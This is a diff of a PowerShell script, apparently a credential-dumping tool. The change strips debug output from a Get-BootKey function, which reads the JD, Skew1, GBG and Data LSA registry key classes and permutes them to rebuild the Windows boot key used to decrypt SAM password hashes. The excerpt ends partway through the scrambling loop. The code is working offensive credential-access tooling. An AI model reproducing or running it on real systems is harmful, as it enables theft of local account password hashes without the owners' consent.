@@ -127,18 +127,10 @@ function LoadApi{
 
 
 function Get-BootKey{
-    $temp = Get-RegKeyClass "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\GBG"
-    Write-Debug $temp 
     $s = [string]::Join("",$("JD","Skew1","GBG","Data" | ForEach-Object {Get-RegKeyClass "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_"}));
     $bootkey = New-Object byte[] $($s.Length/2);
-    $temp = [Convert]::ToByte($s.Substring($(0*2),2),16)
-    Write-Debug $s[0]
-    Write-Debug $s[1]
-    Write-Debug $s.Substring($(0*2),2)
-    Write-Debug $temp
     0..$($bootkey.Length-1) | ForEach-Object{$bootkey[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)}
     $p = @(0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7)
-    Write-Debug $bootkey
     $scrambledBootkey = [byte[]]::new(0)
     foreach ($i in 0..($bootkey.Length - 1)) {
         $scrambledBootkey += $bootkey[$p[$i]..($p[$i])]
